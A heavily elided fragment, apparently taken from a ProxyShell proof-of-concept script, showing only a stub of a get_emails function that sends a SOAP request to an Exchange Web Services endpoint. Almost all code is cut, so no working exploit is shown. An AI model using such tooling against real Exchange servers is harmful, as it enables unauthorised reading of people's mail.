# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-proxyshell-poc\proxyshell-enumerate.py
#!/usr/bin/env python3
#
...
def get_emails(proxyshell):
 ...
 <soap:Body>
    ...
    r = proxyshell.post(f"/EWS/exchange.asmx", data=data, headers=headers)
